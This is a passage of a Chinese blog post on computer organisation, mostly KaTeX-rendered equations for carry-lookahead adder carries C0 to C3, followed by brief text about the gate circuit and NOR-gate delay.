displaystyle="false"><mrow><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>d</mi><mn>2</mn></msub><mo>+</mo><msub><mi>t</mi><mn>2</mn></msub><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><msub><mi>d</mi><mn>2</mn></msub><mo>+</mo><msub><mi>t</mi><mn>2</mn></msub><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><msub><mi>t</mi><mn>2</mn></msub><msub><mi>t</mi><mn>1</mn></msub><msub><mi>d</mi><mn>0</mn></msub><mo>+</mo><msub><mi>t</mi><mn>2</mn></msub><msub><mi>t</mi><mn>1</mn></msub><msub><mi>t</mi><mn>0</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>3</mn></msub><mo>=</mo><msub><mi>d</mi><mn>3</mn></msub><mo>+</mo><msub><mi>t</mi><mn>3</mn></msub><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>d</mi><mn>3</mn></msub><mo>+</mo><msub><mi>t</mi><mn>3</mn></msub><msub><mi>d</mi><mn>2</mn></msub><mo>+</mo><msub><mi>t</mi><mn>3</mn></msub><msub><mi>t</mi><mn>2</mn></msub><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><msub><mi>t</mi><mn>3</mn></msub><msub><mi>t</mi><mn>2</mn></msub><msub><mi>t</mi><mn>1</mn></msub><msub><mi>d</mi><mn>0</mn></msub><mo>+</mo><msub><mi>t</mi><mn>3</mn></msub><msub><mi>t</mi><mn>2</mn></msub><msub><mi>t</mi><mn>1</mn></msub><msub><mi>t</mi><mn>0</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}C_{0}=d_{0}+t_{0} C_{-1} \\C_{1}=d_{1}+t_{1} C_{0}=d_{1}+t_{1} d_{0}+t_{1} t_{0} C_{-1} \\C_{2}=d_{2}+t_{2} C_{1}=d_{2}+t_{2} d_{1}+t_{2} t_{1} d_{0}+t_{2} t_{1} t_{0} C_{-1} \\C_{3}=d_{3}+t_{3} C_{2}=d_{3}+t_{3} d_{2}+t_{3} t_{2} d_{1}+t_{3} t_{2} t_{1} d_{0}+t_{3} t_{2} t_{1} t_{0} C_{-1}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.800000000000001em;vertical-align:-2.1500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.6500000000000004em;"><span style="top:-4.8100000000000005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.2099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.1500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></p><p>仔细分析表达式，均为与操作和或操作，所以我们可以设计出如下电路图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618200308979.png" alt="image-20240618200308979" style="zoom:50%;" /><p>放心，这个图很复杂，看看就好，重点不在这里。</p><p>假设或非门的延迟时间为<span class="katex"><span class="katex-mathml"><math 